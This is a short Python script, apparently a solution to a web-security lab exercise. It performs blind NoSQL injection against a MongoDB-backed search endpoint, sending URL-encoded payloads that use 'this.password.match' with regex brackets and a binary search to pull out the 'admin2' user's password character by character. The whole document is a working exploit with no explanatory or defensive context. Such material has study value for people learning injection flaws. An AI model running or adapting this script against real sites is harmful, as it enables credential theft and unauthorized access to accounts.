#! /usr/bin/env python
# I make no guarantees that this is pretty, but it works!
# And it does do binary search to narrow down possible password combinations!
import sys
import requests

# check if arguments are present
if len(sys.argv) < 2:
  print("Usage: {} http://example.com".format(sys.argv[0]))
  sys.exit(1)
else:
  host = sys.argv[1]
  print("Using hostname: {}".format(host))

baseurl = "/mongodb/example2/?search="
begin = "%27%26%26%20this.password.match(/^"
user = "admin2"
mid = "%5B"
endurl = "%5D.*/)//+%00"
baseregex = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
password = ''

def test_regex(password, regex):
  url = host + baseurl + user + begin + password + mid + regex + endurl
  print(url)
  r = requests.get(url)
  if ('admin' in r.text):
    return True
  else:
    return False

regex = baseregex
done = False
while not done:
  while len(regex) > 1:
    firstregex = regex[:int(len(regex)/2)]
    secondregex = regex[int(len(regex)/2):]

    if test_regex(password, firstregex) == True:
      print("Matched on: {}".format(regex))
      regex = firstregex
      continue
    else:
      print("Not matched on: {}".format(regex))
      regex = secondregex

    print("password so far: {}".format(password))
  # stopping condition
  if(test_regex(password, baseregex) == False) and (len(password) != 0):
    # password is done
    done = True
    break
  # got a single character back
  password += regex
  regex = baseregex
  print(password)

print("Final password: {}".format(password))
